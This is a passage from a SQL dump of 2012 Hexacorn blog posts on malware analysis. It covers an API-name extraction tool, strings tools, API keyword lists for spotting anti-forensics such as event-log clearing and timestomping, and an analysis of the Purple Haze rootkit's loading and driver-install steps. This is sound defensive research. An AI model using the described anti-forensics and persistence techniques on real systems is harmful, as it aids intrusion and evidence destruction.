sample.\nNow, before we proceed further – three warnings here.\n\nYou should never, ever conclude your malware analysis with the output of ‘strings’, or PE parsing tools. This is a first step to shooting yourself in the foot. Always do code analysis. I will come back to this topic in the future in a separate post.\nEnsure you actually know how these PE tools work. I know I don’t need to say this, but I have seen once a person using the Dependency Walker tool and analyzing malicious file by looking at the full list of functions exported from one of the Operating System DLLs. The DLL has not even been linked directly to a malware and was referenced only by a DLL that was directly linked to malicious .exe. In other words, the sample.exe was linked to kernel32.dll, kernel32.dll links to ntdll.dll. The guy was looking at the pane listing all functions exported by ntdll.dll. And while he was right that ntdll.dll does contain a lot of APIs used typically by malware, he was completely off the track! Oh, boy…\nObviously, APIs can often be found outside the import table since many packers, protectors, wrappers move them from import tables to internal data structures – they are often visible only when the memory of the protected process is dumped to a file; thus, none of typical PE parsing tools can ‘see’ them\n\n \nSo, now back to the original topic.\nOne simple noise reduction technique that is well known and used by many analysts is based on lists of patterns; these can be keywords, ANSI or Unicode strings, regular expressions, and practically speaking – any string of bytes that is unique and can be helpful in identifying interesting stuff inside the samples. This technique is used to some extent by projects like Yara, PEiD, and of course, it is extensively used by antivirus and IDS software. Having a good pattern list that identifies certain class of artifacts inside a file is a very attractive idea and I must confess that I am using such lists myself for a number of years.\nAfter thinking one day on how to improve typical ‘strings’ analysis process I cooked a little program that focuses on one class of such patterns – APIs.\nFirst, I built a list of over 50,000 thousands clean APIs, including:\n\nWindows API\nnative APIs\nkernel mode APIs\n\nAll of these are exported and imported by native Windows programs, drivers and DLLs. I combined them together into a large list. I then created a program that uses this list and searches for all of these inside the analyzed binary (note again: I run it most of the time on memory dumps, since many malicious samples come protected).\nYup. It’s that simple.\nNow, you may be asking yourself – searching for 10-15 strings using a naive searching method (i.e. walk 10-15 times though the whole data searching for each string, or even using one regular expression) works well, but it is quite probable that for 50,000 and more strings we need to do better.\nYou are right.\nThis is a non-trivial problem, and naive algorithm doesn’t work here. Luckily, there are smart people out there who already figured it out.  I looked around and researched various multi-pattern search algorithms – eventually deciding to use a very well-known multi-pattern algorithm – Aho-Corasick. It uses a very clever method of finding patterns by walking a trie anytime new character is fetched from the input, so it can search for a large set of patterns simultaneously (well, it’s more complicated than that, but let’s say it is very fast even for 50k patterns).\nSince building the search trie that Aho-Corasick algorithm relies on takes quite some time, I precompiled it and included it directly into an executable. So, here it is – a simple tool that extracts known API names from a given binary.\nI hope you will find it useful.\nUsage:\nhapi <filename>\nDownload\n\nhapi.exe\n\nExample\nUsed on a random malicious sample, it produces the following results:\n————————————————————–\nHAPI v0.1 (c) Hexacorn 2012. All rights reserved.\nVisit us at http://www.hexacorn.com\n————————————————————–\nDnsQuery_A\nDnsRecordListFree\nEnumDeviceDrivers\nGetDeviceDriverBaseNameA\nUuidToStringW\nSRRemoveRestorePoint\nSRSetRestorePointA\nConvertStringSidToSidA\nGetAdaptersInfo\nIsUserAdmin\nInternetOpenUrlA\nHttpOpenRequestA\nInternetCloseHandle\nInternetConnectA\nInternetOpenA\nInternetSetOptionA\nInternetQueryOptionA\nHttpQueryInfoA\nHttpSendRequestA\nInternetReadFile\nHttpAddRequestHeadersA\nmemmove\nmemcmp\n_itoa\nmalloc\nfree\nmemset\nwcstombs\nstrtok\nmbstowcs\nstrlen\n_itow\nsrand\nrand\nmemcpy\nwcsrchr\ntolower\ntowlower\natoi\nstrcpy\n__dllonexit\n_onexit\n_XcptFilter\n_initterm\n_amsg_exit\nexit\n_adjust_fdiv\nlstrlenA\nlstrcpyA\nlstrcatA\nCreateFileA\nDeviceIoControl\nCloseHandle\nGetVersionExA\nCreateFileW\nWriteFile\nFlushFileBuffers\nGetFileSize\nVirtualAlloc\nReadFile\nVirtualFree\nCreateThread\nGetModuleFileNameW\nlstrcpyW\nlstrlenW\nOpenMutexW\nWaitForSingleObject\nWaitForMultipleObjects\nGetExitCodeThread\nSetFilePointer\nSetEndOfFile\nCreateMutexW\nReleaseMutex\nGetModuleFileNameA\nDisableThreadLibraryCalls\nExitProcess\nLoadLibraryW\nSleep\nGetLastError\nInitializeCriticalSection\nDeleteCriticalSection\nEnterCriticalSection\nlstrcatW\nLeaveCriticalSection\nGetCurrentThreadId\nTerminateThread\nGetSystemTimeAsFileTime\nGetProcAddress\nGetModuleHandleA\nOpenProcess\nRaiseException\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\nVirtualFreeEx\nCreateToolhelp32Snapshot\nProcess32First\nlstrcmpiA\nProcess32Next\nGetCurrentProcess\nFreeLibrary\nLoadLibraryA\nlstrcmpiW\nGetWindowsDirectoryA\nGetVolumeInformationA\nGetSystemTime\nSystemTimeToFileTime\nGetTickCount\nGetLogicalDriveStringsW\nGetDriveTypeW\nDeleteFileW\nCreateDirectoryW\nLocalFree\nCreateProcessW\nOpenMutexA\nOpenEventA\nGetCurrentThread\nSetFileTime\nCreateEventW\nTerminateProcess\nDeleteFileA\nWideCharToMultiByte\nHeapAlloc\nGetProcessHeap\nHeapFree\nSetFileAttributesW\nInterlockedIncrement\nInterlockedDecrement\nGetVersion\nInterlockedExchange\nInterlockedCompareExchange\nRtlUnwind\nQueryPerformanceCounter\nGetCurrentProcessId\nUnhandledExceptionFilter\nSetUnhandledExceptionFilter\nCallNextHookEx\nSetWindowsHookExA\nPostMessageA\nwsprintfA\nCharUpperW\nGetSystemMetrics\nRegQueryValueExW\nRegSetValueExW\nRegFlushKey\nRegCloseKey\nRegOpenKeyExW\nOpenProcessToken\nLookupPrivilegeValueA\nAdjustTokenPrivileges\nGetTokenInformation\nRegCreateKeyExW\nSetEntriesInAclA\nSetSecurityInfo\nDuplicateTokenEx\nOpenSCManagerA\nOpenServiceA\nControlService\nChangeServiceConfigA\nAllocateAndInitializeSid\nCheckTokenMembership\nFreeSid\nInitializeSecurityDescriptor\nSetSecurityDescriptorDacl\nSetTokenInformation\nGetLengthSid\nSetThreadToken\nIsValidSid\nConvertSidToStringSidW\nRegDeleteValueW\nRegQueryValueW\nRegQueryInfoKeyW\nRegEnumKeyExW\nRegEnumValueW\nRegDeleteKeyW\nCloseServiceHandle\nQueryServiceConfigA\nQueryServiceStatusEx\nStartServiceA\nSHGetFolderPathW\nSHGetFolderPathA\nCoCreateInstance\nCoInitialize\nCoUninitialize\nCoCreateGuid\nCoTaskMemFree\n_except_handler3\n_local_unwind2\n_CxxThrowException\nDllCanUnloadNow\nDllGetClassObject\nOkay, it’s not random. It’s the same one I used to demonstrate Anti-forensics – live examples \nShare this :)', 'HAPI, Malware Analysis, Software Releases', 'http://www.hexacorn.com/blog/2012/03/03/hapi-api-extractor/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (384, 'Permanent Link to Проверено. у нас мин нет!', 'Hexacorn', 'March 3, 2012 ', 'Two days ago Yandex.ru listed hexacorn.com as malicious.\n\nIt was the only URL checker that highlighted it as malicious, but being on such list is always a serious concern:\n\n \nI checked the web site, compared with the older backups and I didn’t see anything wrong. I then dropped Yandex.ru guys an email, and looks like they fixed their listing  – testing with VirusTotal shows it is all good now:\n\nNot sure what caused this, but well… it’s all about heuristics and they are sometimes wrong.\nGood to see Yandex.ru guys reacted so quickly.\nThanks!\nAnd just in case you are wondering what the title means, this should provide you a context:\n \n\n\n\nAnd no, I am not suggesting there were any mines on Hexacorn. Like everything, context has its scope and err… context \nImage sources:\nhttp://www.gazeta.lv/photos/5/Mina_4.jpg\nhttp://www.gazeta.lv/photos/5/Mina_3.jpg\nhttp://www.gazeta.lv/photos/5/Mina_8.jpg\nShare this :)', 'Hexacorn', 'http://www.hexacorn.com/blog/2012/03/03/%d0%bf%d1%80%d0%be%d0%b2%d0%b5%d1%80%d0%b5%d0%bd%d0%be-%d1%83-%d0%bd%d0%b0%d1%81-%d0%bc%d0%b8%d0%bd-%d0%bd%d0%b5%d1%82/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (385, 'Permanent Link to Wasted Human cycle a.k.a. How dns-ok.us, dns-ok.de, etc. work', 'Hexacorn', 'March 1, 2012 ', 'I came across these web sites while reading news about dnschanger and shutting down the DNS servers that used to be controlled by it. I was curious how it works, so decided to figure it out. Previously (for Conficker for example) this sort of pages just included IFRAMEs pointing to web addresses that were known to be blocked by modified hosts files, e.g. pages of AV companies. If any of these were blocked, you would know there is something going on with your system.\nIn this case it’s different. the page is static and just shows either in\nGREEN\n\nor\nRED\n\nI guessed it may be a change in DNS resolution that is different depending on your DNS settings – if the request goes through the ‘bad guy’, the server will return the ip for the red page, if your settings are good, it will return the green page.\nIndeed, this is the case and you can confirm it via nslookup.\nnslookup dns-ok.us\nName: dns-ok.us\nAddress: 38.68.193.96\nnslookup dns-ok.us 77.67.83.1  <– 77.67.83.1 is a ‘bad guy’ DNS\nName: dns-ok.us\nAddress: 38.68.193.97\nCheck\n\n http://38.68.193.96/\n http://38.68.193.97/\n\n \nNot a rocket science.\nWhen I found out, I googled for IPs and lo and behold, I immediately spotted a comment from a guy using nick ‘TEA-Time’ talking about it few weeks back on Brian Krebs’ blog: https://krebsonsecurity.com/2012/02/half-of-fortune-500s-us-govt-still-infected-with-dnschanger-trojan/\nArgh.\nHere goes yet another wasted human cycle.\nSo this post is for you not to waste yours \nShare this :)', 'Tips & Tricks', 'http://www.hexacorn.com/blog/2012/03/01/how-dns-ok-us-dns-ok-de-etc-work/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (386, 'Permanent Link to RUStrings – extracting Russian strings from files', 'Hexacorn', 'February 25, 2012 ', 'Running typical ‘strings’ tools over a suspicious file provides lots of useful information.The output typically provides an immediate clue what the file’s purpose is e.g. is it a text file, binary file, what is its file format, character encoding, is it compressed, what APIs , file names and URLs it is referring to and so on and so forth. If you are lucky, you may sometimes get a visual output as well e.g. an ASCII art as it is in a case of well-known web shell r57.\n\nNow, the problem with ‘strings’ tools is that they are usually monolingual. They extract English strings in ANSI and Unicode format, but forget about other languages. That is, they are unable to recognize strings that are non-English. Of course, it is non-trivial to write a tool that will recognize strings in a few dozens of languages, as they all use various types of character encodings and each character can occupy not only a single byte, but in many cases multiple bytes.\nRUStrings.pl is a simple perl script that tries to address this issue and while it focuses only on Russian strings, it can be relatively easily extended to cover other languages. The strings it extracts include\n\nANSI\nUnicode\n4 different Russian character encodings\n\nThe output will contain Cyrillic characters and has to be viewed with a proper program supporting various character encodings.\nCompare the following:\n\nobtained via ‘strings’:\n\n\nand\n\nvia ‘RUStrings’:\n\n\nIn case you are wondering what tool I am using to preview these – it is Total Commander’s built-in Lister viewer – it has a very cool feature that allows changing the character encoding on the spot making Cyryllic (and others) characters ‘visible’.\n\nDownload\n\nRUStrings.pl\n\nShare this :)', 'Malware Analysis, Software Releases, Tips & Tricks', 'http://www.hexacorn.com/blog/2012/02/25/rustrings-extracting-russian-strings-from-files-6/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (387, 'Permanent Link to Extracting Strings from PE sections', 'Hexacorn', 'February 21, 2012 ', 'One of the first things we do when we analyze malware is strings extraction. This is a good approach, but there is a problem – neither Sysinternals’ strings nor UNiX/cygwin version provide an ability to extract strings from a specific PE section. Being able to extract strings this way may be handy. It may simplify static analysis and even more importantly, it  helps to avoid noise coming from bad strings. Examples of bad strings are sequences of machine instructions coming from a code section that are interpreted as actual strings. The same goes for ‘strings’ from resource section. This part of file often contain bitmaps, icons and other data that often holds a lot of data that ‘looks’ like strings. We may not want to see these in the output.\nSo, having an ability to extract strings from each section separately would be certainly helpful. There are many way to do so – if you like to code, you can write your own script.\nOr…You can just use a simple method presented below.\nIt turns out that 7zip has an ability to extract sections from PE files. It is available from both GUI and command line. GUI is option is straightforward, as per the command line, use the following:\n“c:\\Program Files\\7-Zip\\7zG.exe” x <filename> -osections\nExample for Notepad.exe is shown below. Note that 7zip also extracts resources into a subdirectory – another handy feature.\n\nWe can now extract strings from .text section only:\n\nNote:\nThere are executables for which extracting strings from specific sections won’t help and may even make you miss something or draw wrong conclusions; these include Borland applications (code and data is mangled together), position-independent code (shellcodes, viruses, code injects), etc.\nShare this :)', 'Malware Analysis, Tips & Tricks', 'http://www.hexacorn.com/blog/2012/02/21/extracting-strings-from-pe-sections/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (388, 'Permanent Link to Forensic Riddle #10 – Answer', 'Hexacorn', 'February 20, 2012 ', 'Changing the file name did the trick. File names that are single characters are treated as drives; if we still want to read the file, we need to use ‘.\\’ prefix – see the screen shot for details:\n\nMore details here.\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/02/20/forensic-riddle-10-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (389, 'Permanent Link to Anti-forensics – live examples', 'Hexacorn', 'February 18, 2012 ', 'Amongst many various techniques that are used by malware to prevent its detection and analysis (e.g. rootkits, disabling OS tools, anti-debug, anti-disasm, anti-dumping, anti-VM, anti-sandbox, etc.), there are a few that are not so common, yet still “make it ” to some malicious releases. These techniques do not prevent malware analysis itself, but aim at making it difficult for forensic guys to analyze post-intrusion activities. And since the reason for using these is to wipe out traces of actual hacking, finding these inside the binaries usually suggests that the malware is designed to be remotely controlled in a manual fashion (and is not a typical botnet serving different purposes like like spam, or DDoS campaigns). Indeed, anti-forensics routines are often seen in backdoors as well as hacking tools used by carders and APT-like malware. Of course, many of these techniques are not new – even old tools from early noughties use it.\nOut of curiosity, I recently searched my sample collection for malware that actually do use anti-forensics techniques (Windows specific only). In order to do searches, I first had to think of various techniques I came across in the past or heard of, and then create a list of interesting targets – this is a list I came up with so far:\n\nCache and cookies cleanup (as shown in Purple Haze)\nEvent Logs cleanup (as used in various hacking tools)\nRestorePoints cleanup (very rarely used technique, I found only a few samples doing so)\nWeak timestomping (used by many samples, it does change only the timestamps visible in Explorer and shell)\nFull timestomping (haven’t seen any sample yet)\nChanging attributes (this one I skipped, because it’s very common, I list it here only for the completeness)\nAlternate Data Streams (also skipped, because it’s quite common and hard to find good keywords)\nPatching (creating a way to autostart malware without any known autostart keys; also skipped as it is hard to find good keywords other than opening or mapping files in memory + file names of files being patched, usually user32.dll, etc. so it’s too generic)\n\nMy searches continue and if I come across something new, I will add it to the list. And if you know some more or spot some techniques I missed, please do let me know.  Thanks in advance!\nSo, here it is – if you see any of these functions in the malware you analyze, you better get ready for some serious business!\nCache/Cookies cache cleanup\nI posted and example recently when I briefly talked about Purple Haze:\n\nAPIs and strings to look for:\n\nFindFirstUrlCacheEntryA / FindFirstUrlCacheEntryW\nUnlockUrlCacheEntryFileA / UnlockUrlCacheEntryFileW\nDeleteUrlCacheEntryA / DeleteUrlCacheEntryW\nFindNextUrlCacheEntryA / FindNextUrlCacheEntryW\nFindCloseUrlCache\n‘cookie’\n‘Temporary Internet Folder’\n\nEvent logs cleanup\nThe recent sample I came across is a new version of Gh0st. Its source can be easily found online, so it’s not a surprise we continue to see new updated versions. A simple routine used to clean the Event logs uses a triplet of functions i.e. OpenEventLog, ClearEventLog and CloseEventLog that is executed with 3 different Event log types i.e. Application, Security, System.\n \n\nAPIs and strings to to look for:\n\nOpenEventLogA / OpenEventLogW\nClearEventLogA / ClearEventLogW\nCloseEventLog\n‘Application’\n‘Security’\n‘System’\n\nRestore Points cleanup\nThis is very rarely seen. The sample I looked at contained the following code:\n\nAPIs and strings to to look for:\n\nSRRemoveRestorePoint\nSRSetRestorePointA / SRSetRestorePointW\n‘srclient.dll’\n‘Last known good configuration’\n\nWeak timestomping\nThis is an easy one:\n\nAPIs and strings to to look for:\n\nGetSystemTime\nSystemTimeToFileTime\nSetFileTime\n\nFull Timestomping\nThis is based on Vincent Liu’s technique used in his timestomp tool and later expanded upon by Joakim Schicht in his SetMACE script – it allows for a full modification of all time stamps within the MFT record on NTFS system (2x $FILE_NAME records and $STANDARD_INFORMATION) either by using NtSetInformationFile / ZwSetInformationFile or by directly writing to a \\\\.\\PhysicalDriveXXX device (where XXX is a number 0, 1, 2, …):\nI have not found any malware using it, but this is also non-trivial to find.\nAPIs and strings to to look for:\n\nNtSetInformationFile / ZwSetInformationFile\n‘\\\\.\\PhysicalDrive’\n\nand often together with the following, commonly used functions:\n\nNtQueryInformationFile / ZwQueryInformationFile\nNtOpenFile / ZwOpenFile\nNtClose / ZwClose\nDeviceIoControl / NtDeviceIoControl / ZwDeviceIoControl\nRtlInitUnicodeString\n\n \nShare this :)', 'Anti-Forensics, Malware Analysis', 'http://www.hexacorn.com/blog/2012/02/18/anti-forensics-live-examples/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (390, 'Permanent Link to Forensic Riddle #10', 'Hexacorn', 'February 15, 2012 ', 'This should be a trivial one, but hopefully it’s interesting nevertheless.\nQuestion: what happened here?\n\nAnswer here\nShare this :)', 'Forensic Riddles', 'http://www.hexacorn.com/blog/2012/02/15/forensic-riddle-10/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (391, 'Permanent Link to Purple Haze – kernel driver', 'Hexacorn', 'February 14, 2012 ', 'One of pieces used by Purple Haze malware is its driver (c:\\WINDOWS\\Temp\\2.tmp) loaded by NtLoadDriver API. It can’t be directly loaded into IDA for analysis, because it contains a layer of protection. One way to bypass it is to use some good anti-rootkit tool e.g. xuetr and dump the malicious kernel driver from memory after it is loaded and decrypted. Since this may not work all the time, sometimes it’s better to control the execution flow through windbg right from the DriverEntry via a well-known IopLoadDriver+xxx trick. Using windbg has many advantages as we can dump physical memory anytime we wish or poke around the code and map findings to IDA as we go along, we can also see decryption in action and prevent any actions driver may take to wipe out the content of memory or detect debuggers.\n\nIn this particular case xuetr worked, and dumping the driver directly from memory is a piece of cake – after fixing the section alignments we can finally load it into IDA.\n\nbtw. if you use IDA’s built-in VOLUME_DISK_EXTENTS structure, you need to fix it as it doesn’t take into account an 8-byte alignment of data – structure members are placed at incorrect offsets (this is not obvious and original MS headers also don’t mention it explicite, so it can be a bit misleading).\n00000000 VOLUME_DISK_EXTENTS struc ; (sizeof=0x18, standard type)\r\n00000000 NumberOfDiskExtents dd ?\r\n00000004 Extents             DISK_EXTENT ?\r\n00000018 VOLUME_DISK_EXTENTS ends\ncorrect:\n00000000 VOLUME_DISK_EXTENTS2 struc ; (sizeof=0x1C)\r\n00000000 NumberOfDiskExtents dd ?\r\n00000004 padding             dd ?\r\n00000008 Extents             DISK_EXTENT ?\r\n0000001C VOLUME_DISK_EXTENTS2 ends\nsimilarly\n 00000000 DEVOBJ_EXTENSION struc ; (sizeof=0x8, standard type)\r\n 00000000 Type            dw ?\r\n 00000002 Size            dw ?\r\n 00000004 DeviceObject    dd ?                    ; offset\r\n 00000008 DEVOBJ_EXTENSION ends\nis more useful with extra fields:\n00000000 DEVOBJ_EXTENSION2 struc ; (sizeof=0x29)\r\n00000000 Type            dw ?\r\n00000002 Size            dw ?\r\n00000004 DeviceObject    dd ?\r\n00000008 PowerFlags      dd ?\r\n0000000C Dope            dd ?\r\n00000010 ExtensionFlags  dd ?\r\n00000014 DeviceNode      dd ?\r\n00000018 AttachedTo      db ?\r\n00000019 StartIoCount    dd ?\r\n0000001D StartIoKey      dd ?\r\n00000021 StartIoFlags    dd ?\r\n00000025 Vpb             dd ?\r\n00000029 DEVOBJ_EXTENSION2 ends\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2012/02/14/purple-haze-kernel-driver/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (392, 'Permanent Link to Purple Haze Analysis', 'Hexacorn', 'February 13, 2012 ', 'As I mentioned in my previous post, last weekend I had a look at Purple Haze malware to see what sort of new stuff can be found there. In this blog entry, I will describe step by step what malware does – i.e. simple static and dynamic analysis. Well, it’s not so simple, but here it goes…\n \nSTATIC ANALYSIS\nFile properties\nName        9746b4f684b9d7d346ff131cd024e68d1b06e1b81571ce6d3c5067f0829d7932\r\nSize        130560  0001FE00\r\nMD5         A1B3E59AE17BA6F940AFAF86485E5907\r\nSHA1        6D07CF72201234A07AB57FB3FC00B9E5A0B3678E\r\nFUZZY       3072:Bkt+9iOinX6OunNa8ad76Jw+0HGdsZ7nncCH6/CH2:Bd8X6/Xad76J0GdkLLH,\r\n            \"9746b4f684b9d7d346ff131cd024e68d1b06e1b81571ce6d3c5067f0829d7932\"\r\nEntropy     7.72339425411489\r\nType        MZ PE i386 DEB\r\nCompiled    2011-06-04 11:45:38 (Saturday)\r\nImage       ImageBase      = 00400000\r\n            SizeOfImage    = 0002B000\r\n            EntryPointRVA  = 0001514B\r\n            EntryPointFile = 0001454B\nSections\r\n.text  \r\n      vo = 00001000, vs = 00018B5A\r\n      fo = 00000400, fs = 00018C00\r\n      flags = E0000020, XWR, CODE\r\n.ctext\r\n      vo = 0001A000, vs = 00003492\r\n      fo = 00019000, fs = 00003600\r\n      flags = 40000040, R, IDATA\r\n.data\r\n      vo = 0001E000, vs = 000085BB\r\n      fo = 0001C600, fs = 00001A00\r\n      flags = C0000040, WR, IDATA\r\n.rdata\r\n      vo = 00027000, vs = 00001502\r\n      fo = 0001E000, fs = 00001600\r\n      flags = 40000040, R, IDATA\r\n.rsrc\r\n      vo = 00029000, vs = 00000010\r\n      fo = 0001F600, fs = 00000200\r\n      flags = 40000040, R, IDATA\r\n.reloc\r\n      vo = 0002A000, vs = 000005D8\r\n      fo = 0001F800, fs = 00000600\r\n      flags = 42000040, R, IDATA\nFile structure\r\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00  MZ..............\r\n...\r\n50 45 00 00 4C 01 06 00 E2 1A EA 4D 00 00 00 00  PE..L......M....\r\n00 00 00 00 E0 00 02 01 0B 01 09 00 00 8C 01 00  ................\r\n...\r\n2E 74 65 78 74 00 00 00 5A 8B 01 00 00 10 00 00  .text...Z.......\r\n00 8C 01 00 00 04 00 00 00 00 00 00 00 00 00 00  ................\r\n00 00 00 00 20 00 00 E0 2E 63 74 65 78 74 00 00  .... ....ctext..\r\n92 34 00 00 00 A0 01 00 00 36 00 00 00 90 01 00  .4.......6......\r\n00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@\r\n2E 64 61 74 61 00 00 00 BB 85 00 00 00 E0 01 00  .data...........\r\n00 1A 00 00 00 C6 01 00 00 00 00 00 00 00 00 00  ................\r\n00 00 00 00 40 00 00 C0 2E 72 64 61 74 61 00 00  ....@....rdata..\r\n02 15 00 00 00 70 02 00 00 16 00 00 00 E0 01 00  .....p..........\r\n00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40  ............@..@\r\n2E 72 73 72 63 00 00 00 10 00 00 00 00 90 02 00  .rsrc...........\r\n00 02 00 00 00 F6 01 00 00 00 00 00 00 00 00 00  ................\r\n00 00 00 00 40 00 00 40 2E 72 65 6C 6F 63 00 00  ....@..@.reloc..\r\nD8 05 00 00 00 A0 02 00 00 06 00 00 00 F8 01 00  ................\r\n00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 42  ............@..B\r\n...\r\n.text    (entropy = 7.73691850981344)\r\n56 47 46 56 57 57 56 47 0A 9C E5 22 67 72 4D 75  VGFVWWVG...\"grMu\r\n4C 75 47 53 06 D6 81 32 93 1D 01 00 EA 07 00 00  LuGS...2........\r\n63 D8 74 9F E7 98 8E A0 77 CB DB A8 60 22 86 98  c.t.....w...`\"..\r\nF2 D4 C2 8D 72 D5 D3 8F 7D C7 52 91 A6 A5 F0 89  ....r...}.R.....\r\n...\r\n.ctext   (entropy = 7.69122372438427)\r\nF8 BC 81 EC 07 59 F0 87 93 EC 91 5B 10 30 C4 0C  .....Y.....[.0..\r\n9B 55 10 2C 9D F8 98 38 18 AF 18 18 6E 82 EF 82  .U.,...8....n...\r\n8B E6 A9 20 5A B1 24 94 08 69 AB E8 72 B0 16 2C  ... Z.$..i..r..,\r\n34 30 30 BD 14 8B B2 BD 3C 24 BC 38 A0 3C 60 2E  400.....<$.8.<`.\r\n...\r\n.data    (entropy = 7.29026900956825)\r\n00 00 00 00 E2 1A EA 4D 00 00 00 00 02 00 00 00  .......M........\r\n3A 00 00 00 45 F8 01 00 45 DE 01 00 4D 6A 6C 6D  :...E...E...Mjlm\r\n74 72 54 6A 55 4F 42 55 44 47 65 44 64 67 6E 58  trTjUOBUDGeDdgnX\r\n55 4A 56 6D 49 6D 4B 50 52 6A 4A 6D 48 4F 58 61  UJVmImKPRjJmHOXa\r\n...\r\n.rdata   (entropy = 5.47242760415688)\r\n64 77 02 00 6E 77 02 00 78 77 02 00 80 77 02 00  dw..nw..xw...w..\r\n8E 77 02 00 A0 77 02 00 A8 77 02 00 B2 77 02 00  .w...w...w...w..\r\nBC 77 02 00 CA 77 02 00 D2 77 02 00 E2 77 02 00  .w...w...w...w..\r\nEA 77 02 00 F8 77 02 00 02 78 02 00 0C 78 02 00  .w...w...x...x..\r\n...\r\n.rsrc    (entropy = 0.020393135236085)\r\n00 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00  ................\r\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\r\n...\r\n.reloc   (entropy = 6.43219032611337)\r\n00 20 00 00 78 00 00 00 14 30 18 30 1C 30 20 30  . ..x....0.0.0 0\r\n24 30 28 30 2C 30 30 30 34 30 38 30 3C 30 40 30  $0(0,0004080<0@0\r\n44 30 48 30 4C 30 50 30 54 30 58 30 5C 30 60 30  D0H0L0P0T0X0\\0`0\r\n64 30 68 30 6C 30 70 30 74 30 78 30 7C 30 80 30  d0h0l0p0t0x0|0.0\r\n...\r\nDebug data\r\n52 53 44 53 F8 D8 EF 46 9B 0A 74 43 A1 B4 9B 36  RSDS...F..tC...6\r\n24 56 EB BC 0B 00 00 00 57 3A 5C 76 44 67 68 6E  $V......W:\\vDghn\r\n4F 7A 6A 70 5C 66 73 65 73 6F 64 67 66 5C 4B 70  Ozjp\\fsesodgf\\Kp\r\n65 47 68 65 41 2E 70 64 62 00                    eGheA.pdb.\r\n\r\n===\r\nEntry Point\r\n2D FB 50 00 00 55 8B EC 81 EC CC 00 00 00 53 BB  -.P..U........S.\r\n6A E2 4C 04 89 5D FC 68 80 E1 41 00 C7 45 F8 69  j.L..].h..A..E.i\r\nE2 4C 04 FF 15 D8 70 42 00 3B 35 D0 20 40 00 81  .L....pB.;5. @..\r\n2D C4 20 40 00 04 21 40 00 81 35 C4 20 40 00 EC  -. @..!@..5. @..\n\nDYNAMIC ANALYSIS\n 9746b4f684b9d7d346ff131cd024e68d1b06e1b81571ce6d3c5067f0829d7932 \n [x] creates/opens file %TEMP%\\1.tmp\r\n [x] creates its own copy changing it on the fly from EXE to DLL\r\n     via MapViewOfFileEx API\r\n      src: \\\\?\\globalroot\\Device\\HarddiskVolume1\\test\\\r\n           9746b4f684b9d7d346ff131cd024e68d1b06e1b81571ce6d3c5067f0829d7932\r\n      dst: %TEMP%\\1.tmp\r\n [x] uses print spooler via AddMonitorW to load %TEMP%\\1.tmp\r\n\r\n%TEMP%\\1.tmp is now loaded inside spoolsv.exe\r\n [x] deletes file %TEMP%\\1.tmp\r\n\r\n [x] creates driver file \\??\\C:\\WINDOWS\\TEMP\\2.tmp\r\n [x] moves file\r\n      src: \\\\?\\globalroot\\Device\\HarddiskVolume1\\test\\\r\n           9746b4f684b9d7d346ff131cd024e68d1b06e1b81571ce6d3c5067f0829d7932\r\n      dst: %TEMP%\\3.tmp\r\n [x] creates service key system\\currentcontrolset\\services\\50d5930\r\n [x] sets reg value HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\50d5930\\\\imagepath\r\n     = \\??\\C:\\WINDOWS\\TEMP\\2.tmp\r\n [x] sets reg value HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\50d5930\\\\type\r\n     = 1\r\n [x] marks file %TEMP%\\3.tmp for deletion via HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\\r\n     Control\\Session Manager\\\\PendingFileRenameOperations\r\n [x] uses NtLoadDriver to loads the driver: \\registry\\machine\\system\\currentcontrolset\\\r\n     services\\50d5930\r\n\r\nwrites internal files to a newly created device\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\ph.dll\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phx.dll\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phd\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phdx\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phs\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phdata\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phld\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phln\r\n [x] creates file \\??\\globalroot\\device\\00000d83\\{7bd8ce81-2e78-3820-e33d-255a2feb1937}\\phlx\r\n [x] deletes kernel driver file C:\\WINDOWS\\TEMP\\2.tmp\r\n\r\ndeletion of 